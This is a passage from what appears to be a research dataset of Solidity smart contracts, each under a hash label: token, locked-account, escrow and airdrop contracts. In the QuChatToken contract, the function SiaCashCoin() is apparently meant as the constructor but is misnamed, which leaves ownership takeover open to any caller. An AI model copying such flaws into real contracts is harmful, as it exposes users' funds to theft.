    function parentSnapshotId()
        public
        constant
        returns(uint256 snapshotId);
}
contract BasicSnapshotToken is
    MTokenTransfer,
    MTokenTransferController,
    IBasicToken,
    IClonedTokenParent,
    Snapshot
{
    IClonedTokenParent private PARENT_TOKEN;
    uint256 private PARENT_SNAPSHOT_ID;
    mapping (address => Values[]) internal _balances;
    Values[] internal _totalSupplyValues;
    function BasicSnapshotToken(
        IClonedTokenParent parentToken,
        uint256 parentSnapshotId
    )
        Snapshot()
        internal
    {
        PARENT_TOKEN = parentToken;
        if (parentToken == address(0)) {
            require(parentSnapshotId == 0);
        } else {
            if (parentSnapshotId == 0) {
                require(parentToken.currentSnapshotId() > 0);
                PARENT_SNAPSHOT_ID = parentToken.currentSnapshotId() - 1;
            } else {
                PARENT_SNAPSHOT_ID = parentSnapshotId;
            }
        }
    }
    function totalSupply()
        public
        constant
        returns (uint256)
    {
        return totalSupplyAtInternal(mCurrentSnapshotId());
    }
    function balanceOf(address owner)
        public
        constant
        returns (uint256 balance)
    {
        return balanceOfAtInternal(owner, mCurrentSnapshotId());
    }
    function transfer(address to, uint256 amount)
        public
        returns (bool success)
    {
        mTransfer(msg.sender, to, amount);
        return true;
    }
    function totalSupplyAt(uint256 snapshotId)
        public
        constant
        returns(uint256)
    {
        return totalSupplyAtInternal(snapshotId);
    }
    function balanceOfAt(address owner, uint256 snapshotId)
        public
        constant
        returns (uint256)
    {
        return balanceOfAtInternal(owner, snapshotId);
    }
    function currentSnapshotId()
        public
        constant
        returns (uint256)
    {
        return mCurrentSnapshotId();
    }
    function parentToken()
        public
        constant
        returns(IClonedTokenParent parent)
    {
        return PARENT_TOKEN;
    }
    function parentSnapshotId()
        public
        constant
        returns(uint256 snapshotId)
    {
        return PARENT_SNAPSHOT_ID;
    }
    function allBalancesOf(address owner)
        external
        constant
        returns (uint256[2][])
    {
        Values[] storage values = _balances[owner];
        uint256[2][] memory balances = new uint256[2][](values.length);
        for(uint256 ii = 0; ii < values.length; ++ii) {
            balances[ii] = [values[ii].snapshotId, values[ii].value];
        }
        return balances;
    }
    function totalSupplyAtInternal(uint256 snapshotId)
        public
        constant
        returns(uint256)
    {
        Values[] storage values = _totalSupplyValues;
        if (hasValueAt(values, snapshotId)) {
            return getValueAt(values, snapshotId, 0);
        }
        if (address(PARENT_TOKEN) != 0) {
            uint256 earlierSnapshotId = PARENT_SNAPSHOT_ID > snapshotId ? snapshotId : PARENT_SNAPSHOT_ID;
            return PARENT_TOKEN.totalSupplyAt(earlierSnapshotId);
        }
        return 0;
    }
    function balanceOfAtInternal(address owner, uint256 snapshotId)
        internal
        constant
        returns (uint256)
    {
        Values[] storage values = _balances[owner];
        if (hasValueAt(values, snapshotId)) {
            return getValueAt(values, snapshotId, 0);
        }
        if (PARENT_TOKEN != address(0)) {
            uint256 earlierSnapshotId = PARENT_SNAPSHOT_ID > snapshotId ? snapshotId : PARENT_SNAPSHOT_ID;
            return PARENT_TOKEN.balanceOfAt(owner, earlierSnapshotId);
        }
        return 0;
    }
    function mTransfer(
        address from,
        address to,
        uint256 amount
    )
        internal
    {
        require(to != address(0));
        require(parentToken() == address(0) || parentSnapshotId() < parentToken().currentSnapshotId());
        require(mOnTransfer(from, to, amount));
        var previousBalanceFrom = balanceOf(from);
        require(previousBalanceFrom >= amount);
        uint256 newBalanceFrom = previousBalanceFrom - amount;
        setValue(_balances[from], newBalanceFrom);
        uint256 previousBalanceTo = balanceOf(to);
        uint256 newBalanceTo = previousBalanceTo + amount;
        assert(newBalanceTo >= previousBalanceTo); 
        setValue(_balances[to], newBalanceTo);
        Transfer(from, to, amount);
    }
}
contract MTokenMint {
    function mGenerateTokens(address owner, uint256 amount)
        internal;
    function mDestroyTokens(address owner, uint256 amount)
        internal;
}
contract MintableSnapshotToken is
    BasicSnapshotToken,
    MTokenMint
{
    function MintableSnapshotToken(
        IClonedTokenParent parentToken,
        uint256 parentSnapshotId
    )
        BasicSnapshotToken(parentToken, parentSnapshotId)
        internal
    {}
    function mGenerateTokens(address owner, uint256 amount)
        internal
    {
        require(owner != address(0));
        require(parentToken() == address(0) || parentSnapshotId() < parentToken().currentSnapshotId());
        uint256 curTotalSupply = totalSupply();
        uint256 newTotalSupply = curTotalSupply + amount;
        require(newTotalSupply >= curTotalSupply); 
        uint256 previousBalanceTo = balanceOf(owner);
        uint256 newBalanceTo = previousBalanceTo + amount;
        assert(newBalanceTo >= previousBalanceTo); 
        setValue(_totalSupplyValues, newTotalSupply);
        setValue(_balances[owner], newBalanceTo);
        Transfer(0, owner, amount);
    }
    function mDestroyTokens(address owner, uint256 amount)
        internal
    {
        require(parentToken() == address(0) || parentSnapshotId() < parentToken().currentSnapshotId());
        uint256 curTotalSupply = totalSupply();
        require(curTotalSupply >= amount);
        uint256 previousBalanceFrom = balanceOf(owner);
        require(previousBalanceFrom >= amount);
        uint256 newTotalSupply = curTotalSupply - amount;
        uint256 newBalanceFrom = previousBalanceFrom - amount;
        setValue(_totalSupplyValues, newTotalSupply);
        setValue(_balances[owner], newBalanceFrom);
        Transfer(owner, 0, amount);
    }
}
contract StandardSnapshotToken is
    IERC20Token,
    MintableSnapshotToken,
    TokenAllowance,
    IERC223Token,
    IsContract
{
    function StandardSnapshotToken(
        IClonedTokenParent parentToken,
        uint256 parentSnapshotId
    )
        MintableSnapshotToken(parentToken, parentSnapshotId)
        TokenAllowance()
        internal
    {}
    function transfer(address to, uint256 amount, bytes data)
        public
        returns (bool)
    {
        BasicSnapshotToken.mTransfer(msg.sender, to, amount);
        if (isContract(to)) {
            IERC223Callback(to).onTokenTransfer(msg.sender, amount, data);
        }
        return true;
    }
}
contract Neumark is
    AccessControlled,
    AccessRoles,
    Agreement,
    DailyAndSnapshotable,
    StandardSnapshotToken,
    TokenMetadata,
    NeumarkIssuanceCurve,
    Reclaimable
{
    string private constant TOKEN_NAME = "Neumark";
    uint8  private constant TOKEN_DECIMALS = 18;
    string private constant TOKEN_SYMBOL = "NEU";
    string private constant VERSION = "NMK_1.0";
    bool private _transferEnabled = false;
    uint256 private _totalEurUlps;
    event LogNeumarksIssued(
        address indexed owner,
        uint256 euroUlps,
        uint256 neumarkUlps
    );
    event LogNeumarksBurned(
        address indexed owner,
        uint256 euroUlps,
        uint256 neumarkUlps
    );
    function Neumark(
        IAccessPolicy accessPolicy,
        IEthereumForkArbiter forkArbiter
    )
        AccessControlled(accessPolicy)
        AccessRoles()
        Agreement(accessPolicy, forkArbiter)
        StandardSnapshotToken(
            IClonedTokenParent(0x0),
            0
        )
        TokenMetadata(
            TOKEN_NAME,
            TOKEN_DECIMALS,
            TOKEN_SYMBOL,
            VERSION
        )
        DailyAndSnapshotable(0)
        NeumarkIssuanceCurve()
        Reclaimable()
        public
    {}
    function issueForEuro(uint256 euroUlps)
        public
        only(ROLE_NEUMARK_ISSUER)
        acceptAgreement(msg.sender)
        returns (uint256)
    {
        require(_totalEurUlps + euroUlps >= _totalEurUlps);
        uint256 neumarkUlps = incremental(_totalEurUlps, euroUlps);
        _totalEurUlps += euroUlps;
        mGenerateTokens(msg.sender, neumarkUlps);
        LogNeumarksIssued(msg.sender, euroUlps, neumarkUlps);
        return neumarkUlps;
    }
    function distribute(address to, uint256 neumarkUlps)
        public
        only(ROLE_NEUMARK_ISSUER)
        acceptAgreement(to)
    {
        mTransfer(msg.sender, to, neumarkUlps);
    }
    function burn(uint256 neumarkUlps)
        public
        only(ROLE_NEUMARK_BURNER)
    {
        burnPrivate(neumarkUlps, 0, _totalEurUlps);
    }
    function burn(uint256 neumarkUlps, uint256 minEurUlps, uint256 maxEurUlps)
        public
        only(ROLE_NEUMARK_BURNER)
    {
        burnPrivate(neumarkUlps, minEurUlps, maxEurUlps);
    }
    function enableTransfer(bool enabled)
        public
        only(ROLE_TRANSFER_ADMIN)
    {
        _transferEnabled = enabled;
    }
    function createSnapshot()
        public
        only(ROLE_SNAPSHOT_CREATOR)
        returns (uint256)
    {
        return DailyAndSnapshotable.createSnapshot();
    }
    function transferEnabled()
        public
        constant
        returns (bool)
    {
        return _transferEnabled;
    }
    function totalEuroUlps()
        public
        constant
        returns (uint256)
    {
        return _totalEurUlps;
    }
    function incremental(uint256 euroUlps)
        public
        constant
        returns (uint256 neumarkUlps)
    {
        return incremental(_totalEurUlps, euroUlps);
    }
    function mOnTransfer(
        address from,
        address, 
        uint256 
    )
        internal
        acceptAgreement(from)
        returns (bool allow)
    {
        return _transferEnabled || accessPolicy().allowed(msg.sender, ROLE_NEUMARK_ISSUER, this, msg.sig);
    }
    function mOnApprove(
        address owner,
        address, 
        uint256 
    )
        internal
        acceptAgreement(owner)
        returns (bool allow)
    {
        return true;
    }
    function burnPrivate(uint256 burnNeumarkUlps, uint256 minEurUlps, uint256 maxEurUlps)
        private
    {
        uint256 prevEuroUlps = _totalEurUlps;
        mDestroyTokens(msg.sender, burnNeumarkUlps);
        _totalEurUlps = cumulativeInverse(totalSupply(), minEurUlps, maxEurUlps);
        assert(prevEuroUlps >= _totalEurUlps);
        uint256 euroUlps = prevEuroUlps - _totalEurUlps;
        LogNeumarksBurned(msg.sender, euroUlps, burnNeumarkUlps);
    }
}
contract TimeSource {
    function currentTime() internal constant returns (uint256) {
        return block.timestamp;
    }
}
contract LockedAccount is
    AccessControlled,
    AccessRoles,
    TimeSource,
    Math,
    IsContract,
    MigrationSource,
    IERC677Callback,
    Reclaimable
{
    enum LockState {
        Uncontrolled,
        AcceptingLocks,
        AcceptingUnlocks,
        ReleaseAll
    }
    struct Account {
        uint256 balance;
        uint256 neumarksDue;
        uint256 unlockDate;
    }
    IERC677Token private ASSET_TOKEN;
    Neumark private NEUMARK;
    uint256 private LOCK_PERIOD;
    uint256 private PENALTY_FRACTION;
    uint256 private _totalLockedAmount;
    uint256 internal _totalInvestors;
    LockState private _lockState;
    address private _controller;
    address private _penaltyDisbursalAddress;
    mapping(address => Account) internal _accounts;
    event LogFundsLocked(
        address indexed investor,
        uint256 amount,
        uint256 neumarks
    );
    event LogFundsUnlocked(
        address indexed investor,
        uint256 amount,
        uint256 neumarks
    );
    event LogPenaltyDisbursed(
        address indexed disbursalPoolAddress,
        uint256 amount,
        address assetToken,
        address investor
    );
    event LogLockStateTransition(
        LockState oldState,
        LockState newState
    );
    event LogInvestorMigrated(
        address indexed investor,
        uint256 amount,
        uint256 neumarks,
        uint256 unlockDate
    );
    modifier onlyController() {
        require(msg.sender == address(_controller));
        _;
    }
    modifier onlyState(LockState state) {
        require(_lockState == state);
        _;
    }
    modifier onlyStates(LockState state1, LockState state2) {
        require(_lockState == state1 || _lockState == state2);
        _;
    }
    function LockedAccount(
        IAccessPolicy policy,
        IERC677Token assetToken,
        Neumark neumark,
        address penaltyDisbursalAddress,
        uint256 lockPeriod,
        uint256 penaltyFraction
    )
        AccessControlled(policy)
        MigrationSource(policy, ROLE_LOCKED_ACCOUNT_ADMIN)
        Reclaimable()
        public
    {
        ASSET_TOKEN = assetToken;
        NEUMARK = neumark;
        LOCK_PERIOD = lockPeriod;
        PENALTY_FRACTION = penaltyFraction;
        _penaltyDisbursalAddress = penaltyDisbursalAddress;
    }
    function lock(address investor, uint256 amount, uint256 neumarks)
        public
        onlyState(LockState.AcceptingLocks)
        onlyController()
    {
        require(amount > 0);
        assert(ASSET_TOKEN.transferFrom(msg.sender, address(this), amount));
        Account storage account = _accounts[investor];
        account.balance = addBalance(account.balance, amount);
        account.neumarksDue = add(account.neumarksDue, neumarks);
        if (account.unlockDate == 0) {
            _totalInvestors += 1;
            account.unlockDate = currentTime() + LOCK_PERIOD;
        }
        LogFundsLocked(investor, amount, neumarks);
    }
    function unlock()
        public
        onlyStates(LockState.AcceptingUnlocks, LockState.ReleaseAll)
    {
        unlockInvestor(msg.sender);
    }
    function receiveApproval(
        address from,
        uint256, 
        address _token,
        bytes _data
    )
        public
        onlyState(LockState.AcceptingUnlocks)
        returns (bool)
    {
        require(msg.sender == _token);
        require(_data.length == 0);
        require(_token == address(NEUMARK));
        unlockInvestor(from);
        return true;
    }
    function controllerFailed()
        public
        onlyState(LockState.AcceptingLocks)
        onlyController()
    {
        changeState(LockState.ReleaseAll);
    }
    function controllerSucceeded()
        public
        onlyState(LockState.AcceptingLocks)
        onlyController()
    {
        changeState(LockState.AcceptingUnlocks);
    }
    function setController(address controller)
        public
        only(ROLE_LOCKED_ACCOUNT_ADMIN)
        onlyState(LockState.Uncontrolled)
    {
        _controller = controller;
        changeState(LockState.AcceptingLocks);
    }
    function setPenaltyDisbursal(address penaltyDisbursalAddress)
        public
        only(ROLE_LOCKED_ACCOUNT_ADMIN)
    {
        require(penaltyDisbursalAddress != address(0));
        _penaltyDisbursalAddress = penaltyDisbursalAddress;
    }
    function assetToken()
        public
        constant
        returns (IERC677Token)
    {
        return ASSET_TOKEN;
    }
    function neumark()
        public
        constant
        returns (Neumark)
    {
        return NEUMARK;
    }
    function lockPeriod()
        public
        constant
        returns (uint256)
    {
        return LOCK_PERIOD;
    }
    function penaltyFraction()
        public
        constant
        returns (uint256)
    {
        return PENALTY_FRACTION;
    }
    function balanceOf(address investor)
        public
        constant
        returns (uint256, uint256, uint256)
    {
        Account storage account = _accounts[investor];
        return (account.balance, account.neumarksDue, account.unlockDate);
    }
    function controller()
        public
        constant
        returns (address)
    {
        return _controller;
    }
    function lockState()
        public
        constant
        returns (LockState)
    {
        return _lockState;
    }
    function totalLockedAmount()
        public
        constant
        returns (uint256)
    {
        return _totalLockedAmount;
    }
    function totalInvestors()
        public
        constant
        returns (uint256)
    {
        return _totalInvestors;
    }
    function penaltyDisbursalAddress()
        public
        constant
        returns (address)
    {
        return _penaltyDisbursalAddress;
    }
    function enableMigration(IMigrationTarget migration)
        public
        onlyStates(LockState.AcceptingLocks, LockState.AcceptingUnlocks)
    {
        MigrationSource.enableMigration(migration);
    }
    function migrate()
        public
        onlyMigrationEnabled()
    {
        Account memory account = _accounts[msg.sender];
        if (account.balance == 0) {
            return;
        }
        removeInvestor(msg.sender, account.balance);
        assert(ASSET_TOKEN.approve(address(_migration), account.balance));
        LockedAccountMigration(_migration).migrateInvestor(
            msg.sender,
            account.balance,
            account.neumarksDue,
            account.unlockDate
        );
        LogInvestorMigrated(msg.sender, account.balance, account.neumarksDue, account.unlockDate);
    }
    function reclaim(IBasicToken token)
        public
    {
        require(token != ASSET_TOKEN);
        Reclaimable.reclaim(token);
    }
    function addBalance(uint256 balance, uint256 amount)
        internal
        returns (uint256)
    {
        _totalLockedAmount = add(_totalLockedAmount, amount);
        uint256 newBalance = balance + amount;
        return newBalance;
    }
    function subBalance(uint256 balance, uint256 amount)
        private
        returns (uint256)
    {
        _totalLockedAmount -= amount;
        return balance - amount;
    }
    function removeInvestor(address investor, uint256 balance)
        private
    {
        subBalance(balance, balance);
        _totalInvestors -= 1;
        delete _accounts[investor];
    }
    function changeState(LockState newState)
        private
    {
        assert(newState != _lockState);
        LogLockStateTransition(_lockState, newState);
        _lockState = newState;
    }
    function unlockInvestor(address investor)
        private
    {
        Account memory accountInMem = _accounts[investor];
        if (accountInMem.balance == 0) {
            return;
        }
        removeInvestor(investor, accountInMem.balance);
        if (_lockState == LockState.AcceptingUnlocks) {
            require(NEUMARK.transferFrom(investor, address(this), accountInMem.neumarksDue));
            NEUMARK.burn(accountInMem.neumarksDue);
            if (currentTime() < accountInMem.unlockDate) {
                require(_penaltyDisbursalAddress != address(0));
                uint256 penalty = decimalFraction(accountInMem.balance, PENALTY_FRACTION);
                if (isContract(_penaltyDisbursalAddress)) {
                    require(
                        ASSET_TOKEN.approveAndCall(_penaltyDisbursalAddress,penalty, "")
                    );
                } else {
                    assert(ASSET_TOKEN.transfer(_penaltyDisbursalAddress, penalty));
                }
                LogPenaltyDisbursed(_penaltyDisbursalAddress, penalty, ASSET_TOKEN, investor);
                accountInMem.balance -= penalty;
            }
        }
        if (_lockState == LockState.ReleaseAll) {
            accountInMem.neumarksDue = 0;
        }
        assert(ASSET_TOKEN.transfer(investor, accountInMem.balance));
        LogFundsUnlocked(investor, accountInMem.balance, accountInMem.neumarksDue);
    }
}
```

## RQ1_36cdc1206b94

SHA-256 `f54365b01cb7897f6e6e1730a213858b1ea0eb83adc3f30a8962ebe8056e5aa3`

```solidity
pragma solidity 0.4.24;
interface ITokenContract {
    function balanceOf(address _owner) external view returns (uint256 balance);
    function transfer(
        address _to, 
        uint256 _amount
    )
        external 
        returns (bool success);
    function transferFrom(
        address _from, 
        address _to, 
        uint256 _amount
    ) 
        external 
        returns (bool success);
}
contract Escrow_v1_0 {
    using SafeMath for uint256;
    enum Status {FUNDED, RELEASED}
    enum TransactionType {ETHER, TOKEN}
    event Executed(
        bytes32 indexed scriptHash,
        address[] destinations,
        uint256[] amounts
    );
    event FundAdded(
        bytes32 indexed scriptHash,
        address indexed from,
        uint256 valueAdded
    );
    event Funded(
        bytes32 indexed scriptHash,
        address indexed from,
        uint256 value
    );
    struct Transaction {
        uint256 value;
        uint256 lastModified; 
        Status status;
        TransactionType transactionType;
        uint8 threshold;
        uint32 timeoutHours;
        address buyer;
        address seller;
        address tokenAddress; 
        address moderator;
        mapping(address => bool) isOwner; 
        mapping(address => bool) voted; 
        mapping(address => bool) beneficiaries; 
    }
    mapping(bytes32 => Transaction) public transactions;
    uint256 public transactionCount = 0;
    mapping(address => bytes32[]) private partyVsTransaction;
    modifier transactionExists(bytes32 scriptHash) {
        require(
            transactions[scriptHash].value != 0, "Transaction does not exist"
        );
        _;
    }
    modifier transactionDoesNotExist(bytes32 scriptHash) {
        require(transactions[scriptHash].value == 0, "Transaction exists");
        _;
    }
    modifier inFundedState(bytes32 scriptHash) {
        require(
            transactions[scriptHash].status == Status.FUNDED,
            "Transaction is not in FUNDED state"
        );
        _;
    }
    modifier nonZeroAddress(address addressToCheck) {
        require(addressToCheck != address(0), "Zero address passed");
        _;
    }
    modifier checkTransactionType(
        bytes32 scriptHash,
        TransactionType transactionType
    )
    {
        require(
            transactions[scriptHash].transactionType == transactionType,
            "Transaction type does not match"
        );
        _;
    }
    modifier onlyBuyer(bytes32 scriptHash) {
        require(
            msg.sender == transactions[scriptHash].buyer,
            "The initiator of the transaction is not buyer"
        );
        _;
    }
    function addTransaction(
        address buyer,
        address seller,
        address moderator,
        uint8 threshold,
        uint32 timeoutHours,
        bytes32 scriptHash,
        bytes20 uniqueId
    )
        external
        payable
        transactionDoesNotExist(scriptHash)
        nonZeroAddress(buyer)
        nonZeroAddress(seller)
    {
        _addTransaction(
            buyer,
            seller,
            moderator,
            threshold,
            timeoutHours,
            scriptHash,
            msg.value,
            uniqueId,
            TransactionType.ETHER,
            address(0)
        );
        emit Funded(scriptHash, msg.sender, msg.value);
    }
    function addTokenTransaction(
        address buyer,
        address seller,
        address moderator,
        uint8 threshold,
        uint32 timeoutHours,
        bytes32 scriptHash,
        uint256 value,
        bytes20 uniqueId,
        address tokenAddress
    )
        external
        transactionDoesNotExist(scriptHash)
        nonZeroAddress(buyer)
        nonZeroAddress(seller)
        nonZeroAddress(tokenAddress)
    {
        _addTransaction(
            buyer,
            seller,
            moderator,
            threshold,
            timeoutHours,
            scriptHash,
            value,
            uniqueId,
            TransactionType.TOKEN,
            tokenAddress
        );
        ITokenContract token = ITokenContract(tokenAddress);
        require(
            token.transferFrom(msg.sender, address(this), value),
            "Token transfer failed, maybe you did not approve escrow contract to spend on behalf of sender"
        );
        emit Funded(scriptHash, msg.sender, value);
    }
    function checkBeneficiary(
        bytes32 scriptHash,
        address beneficiary
    )
        external
        view
        returns (bool)
    {
        return transactions[scriptHash].beneficiaries[beneficiary];
    }
    function checkVote(
        bytes32 scriptHash,
        address party
    )
        external
        view
        returns (bool)
    {
        return transactions[scriptHash].voted[party];
    }
    function addFundsToTransaction(
        bytes32 scriptHash
    )
        external
        payable
        transactionExists(scriptHash)
        inFundedState(scriptHash)
        checkTransactionType(scriptHash, TransactionType.ETHER)
        onlyBuyer(scriptHash)
    {
        require(msg.value > 0, "Value must be greater than zero.");
        transactions[scriptHash].value = transactions[scriptHash].value
            .add(msg.value);
        emit FundAdded(scriptHash, msg.sender, msg.value);
    }
    function addTokensToTransaction(
        bytes32 scriptHash,
        uint256 value
    )
        external
        transactionExists(scriptHash)
        inFundedState(scriptHash)
        checkTransactionType(scriptHash, TransactionType.TOKEN)
        onlyBuyer(scriptHash)
    {
        require(value > 0, "Value must be greater than zero.");
        ITokenContract token = ITokenContract(
            transactions[scriptHash].tokenAddress
        );
        require(
            token.transferFrom(msg.sender, address(this), value),
            "Token transfer failed, maybe you did not approve the escrow contract to spend on behalf of the buyer"
        );
        transactions[scriptHash].value = transactions[scriptHash].value
            .add(value);
        emit FundAdded(scriptHash, msg.sender, value);
    }
    function getAllTransactionsForParty(
        address partyAddress
    )
        external
        view
        returns (bytes32[])
    {
        return partyVsTransaction[partyAddress];
    }
    function execute(
        uint8[] sigV,
        bytes32[] sigR,
        bytes32[] sigS,
        bytes32 scriptHash,
        address[] destinations,
        uint256[] amounts
    )
        external
        transactionExists(scriptHash)
        inFundedState(scriptHash)
    {
        require(
            destinations.length > 0,
            "Number of destinations must be greater than 0"
        );
        require(
            destinations.length == amounts.length,
            "Number of destinations must match number of values sent"
        );
        _verifyTransaction(
            sigV,
            sigR,
            sigS,
            scriptHash,
            destinations,
            amounts
        );
        transactions[scriptHash].status = Status.RELEASED;
        transactions[scriptHash].lastModified = block.timestamp;
        require(
            _transferFunds(scriptHash, destinations, amounts) == transactions[scriptHash].value,
            "Total value to be released must be equal to the transaction escrow value"
        );
        emit Executed(scriptHash, destinations, amounts);
    }
    function calculateRedeemScriptHash(
        bytes20 uniqueId,
        uint8 threshold,
        uint32 timeoutHours,
        address buyer,
        address seller,
        address moderator,
        address tokenAddress
    )
        public
        view
        returns (bytes32)
    {
        if (tokenAddress == address(0)) {
            return keccak256(
                abi.encodePacked(
                    uniqueId,
                    threshold,
                    timeoutHours,
                    buyer,
                    seller,
                    moderator,
                    address(this)
                )
            );
        } else {
            return keccak256(
                abi.encodePacked(
                    uniqueId,
                    threshold,
                    timeoutHours,
                    buyer,
                    seller,
                    moderator,
                    address(this),
                    tokenAddress
                )
            );
        }
    }
    function _verifyTransaction(
        uint8[] sigV,
        bytes32[] sigR,
        bytes32[] sigS,
        bytes32 scriptHash,
        address[] destinations,
        uint256[] amounts
    )
        private
    {
        _verifySignatures(
            sigV,
            sigR,
            sigS,
            scriptHash,
            destinations,
            amounts
        );
        bool timeLockExpired = _isTimeLockExpired(
            transactions[scriptHash].timeoutHours,
            transactions[scriptHash].lastModified
        );
        if (sigV.length < transactions[scriptHash].threshold) {
            if (!timeLockExpired) {
                revert("Min number of sigs not present and timelock not expired");
            }
            else if (!transactions[scriptHash].voted[transactions[scriptHash].seller]) {
                revert("Min number of sigs not present and seller did not sign");
            }
        }
    }
    function _transferFunds(
        bytes32 scriptHash,
        address[]destinations,
        uint256[]amounts
    )
        private
        returns (uint256)
    {
        Transaction storage t = transactions[scriptHash];
        uint256 valueTransferred = 0;
        if (t.transactionType == TransactionType.ETHER) {
            for (uint256 i = 0; i < destinations.length; i++) {
                require(
                    destinations[i] != address(0),
                    "zero address is not allowed as destination address"
                );
                require(
                    t.isOwner[destinations[i]],
                    "Destination address is not one of the owners"
                );
                require(
                    amounts[i] > 0,
                    "Amount to be sent should be greater than 0"
                );
                valueTransferred = valueTransferred.add(amounts[i]);
                t.beneficiaries[destinations[i]] = true;
                destinations[i].transfer(amounts[i]);
            }
        } else if (t.transactionType == TransactionType.TOKEN) {
            ITokenContract token = ITokenContract(t.tokenAddress);
            for (uint256 j = 0; j<destinations.length; j++) {
                require(
                    destinations[j] != address(0),
                    "zero address is not allowed as destination address"
                );
                require(
                    t.isOwner[destinations[j]],
                    "Destination address is not one of the owners"
                );
                require(
                    amounts[j] > 0,
                    "Amount to be sent should be greater than 0"
                );
                valueTransferred = valueTransferred.add(amounts[j]);
                t.beneficiaries[destinations[j]] = true;
                require(
                    token.transfer(destinations[j], amounts[j]),
                    "Token transfer failed."
                );
            }
        }
        return valueTransferred;
    }
    function _verifySignatures(
        uint8[] sigV,
        bytes32[] sigR,
        bytes32[] sigS,
        bytes32 scriptHash,
        address[] destinations,
        uint256[]amounts
    )
        private
    {
        require(sigR.length == sigS.length, "R,S length mismatch");
        require(sigR.length == sigV.length, "R,V length mismatch");
        bytes32 txHash = keccak256(
            abi.encodePacked(
                "\x19Ethereum Signed Message:\n32",
                keccak256(
                    abi.encodePacked(
                        byte(0x19),
                        byte(0),
                        address(this),
                        destinations,
                        amounts,
                        scriptHash
                    )
                )
            )
        );
        for (uint i = 0; i < sigR.length; i++) {
            address recovered = ecrecover(
                txHash,
                sigV[i],
                sigR[i],
                sigS[i]
            );
            require(
                transactions[scriptHash].isOwner[recovered],
                "Invalid signature"
            );
            require(
                !transactions[scriptHash].voted[recovered],
                "Same signature sent twice"
            );
            transactions[scriptHash].voted[recovered] = true;
        }
    }
    function _isTimeLockExpired(
        uint32 timeoutHours,
        uint256 lastModified
    )
        private
        view
        returns (bool)
    {
        uint256 timeSince = now.sub(lastModified);
        return (
            timeoutHours == 0 ? false : timeSince > uint256(timeoutHours).mul(3600)
        );
    }
    function _addTransaction(
        address buyer,
        address seller,
        address moderator,
        uint8 threshold,
        uint32 timeoutHours,
        bytes32 scriptHash,
        uint256 value,
        bytes20 uniqueId,
        TransactionType transactionType,
        address tokenAddress
    )
        private
    {
        require(buyer != seller, "Buyer and seller are same");
        require(value > 0, "Value passed is 0");
        require(threshold > 0, "Threshold must be greater than 0");
        require(threshold <= 3, "Threshold must not be greater than 3");
        require(
            threshold == 1 || moderator != address(0),
            "Either threshold should be 1 or valid moderator address should be passed"
        );
        require(
            scriptHash == calculateRedeemScriptHash(
                uniqueId,
                threshold,
                timeoutHours,
                buyer,
                seller,
                moderator,
                tokenAddress
            ),
            "Calculated script hash does not match passed script hash."
        );
        transactions[scriptHash] = Transaction({
            buyer: buyer,
            seller: seller,
            moderator: moderator,
            value: value,
            status: Status.FUNDED,
            lastModified: block.timestamp,
            threshold: threshold,
            timeoutHours: timeoutHours,
            transactionType:transactionType,
            tokenAddress:tokenAddress
        });
        transactions[scriptHash].isOwner[seller] = true;
        transactions[scriptHash].isOwner[buyer] = true;
        require(
            !transactions[scriptHash].isOwner[moderator],
            "Either buyer or seller is passed as moderator"
        );
        if (threshold > 1) {
            transactions[scriptHash].isOwner[moderator] = true;
        }
        transactionCount++;
        partyVsTransaction[buyer].push(scriptHash);
        partyVsTransaction[seller].push(scriptHash);
    }
}
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}
```

## RQ1_8fc7cb311c42

SHA-256 `be4d17b4f67e1cad305db72eb7ce51e026e48634ede8b2aae9c50a6a5d2ea830`

```solidity
pragma solidity ^0.4.26;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}
contract ForeignToken {
    function balanceOf(address _owner) constant public returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
}
contract ERC20Basic {
    uint256 public totalSupply;
    function balanceOf(address who) public constant returns (uint256);
    function transfer(address to, uint256 value) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public constant returns (uint256);
    function transferFrom(address from, address to, uint256 value) public returns (bool);
    function approve(address spender, uint256 value) public returns (bool);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface Token { 
    function distr(address _to, uint256 _value) external returns (bool);
    function totalSupply() constant external returns (uint256 supply);
    function balanceOf(address _owner) constant external returns (uint256 balance);
}
contract QuChatToken is ERC20 {
    using SafeMath for uint256;
    address owner = msg.sender;
    mapping (address => uint256) balances;
    mapping (address => mapping (address => uint256)) allowed;
    mapping (address => bool) public blacklist;
    string public constant name = "QuChatToken";
    string public constant symbol = "QCT";
    uint public constant decimals = 18;
uint256 public totalSupply = 23000000000e18;
uint256 public totalDistributed = 13800000000e18;
uint256 public totalRemaining = totalSupply.sub(totalDistributed);
uint256 public value = 200000e18;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event Distr(address indexed to, uint256 amount);
    event DistrFinished();
    event Burn(address indexed burner, uint256 value);
    bool public distributionFinished = false;
    modifier canDistr() {
        require(!distributionFinished);
        _;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
    modifier onlyWhitelist() {
        require(blacklist[msg.sender] == false);
        _;
    }
    function SiaCashCoin() public {
        owner = msg.sender;
        balances[owner] = totalDistributed;
    }
    function transferOwnership(address newOwner) onlyOwner public {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }
    function finishDistribution() onlyOwner canDistr public returns (bool) {
        distributionFinished = true;
        emit DistrFinished();
        return true;
    }
